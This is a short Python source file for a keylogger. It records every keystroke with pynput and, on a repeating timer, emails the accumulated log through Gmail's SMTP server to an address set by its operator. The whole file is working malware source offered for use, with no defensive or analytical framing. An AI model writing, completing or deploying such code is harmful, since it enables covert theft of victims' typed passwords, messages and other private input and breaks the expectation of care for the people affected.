import pynput.keyboard
import threading
import smtplib


class Keylogger: #class

    def __init__(self ,time_interval , email , password):                         #using constructor method
        self.log = "KeyLogger started"
        self.interval = time_interval                          #set time constructor mail S
        self.email = email
        self.password = password
       # print("We are in use constructor method")
    def append_to_log(self, string):
            self.log = self.log +string

    def process_key_press(self, key):
        #global log
        try:
            current_key = str(key.char)
            #log = log + str(key.char)
            #self.append_to_log(str(key.char))
        except AttributeError:
            if key == key.space:
                current_key = " "
                #log = log + " "
            else:
                current_key = " " + str(key) + " "
             #log = log +" "+ str(key)
        self.append_to_log(current_key)
        #print(log)


    def report(self):
        #global log
        #print(self.log)
        self.send_mail(self.email , self.password ,"\n\n" + self.log)
        self.log = ""
        #log = ""
        timrer = threading.Timer(self.interval , self.report)
        timrer.start()

    def send_mail(self ,email, passwor , message):
        server = smtplib.SMTP("smtp.gmail.com",535)
        server.starttls()
        server.login(email ,passwor)
        server.sendmail(email, email, message)
        server.quit()

    def  start(self):
        keybord_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keybord_listener:
            self.report()
            keybord_listener.join()

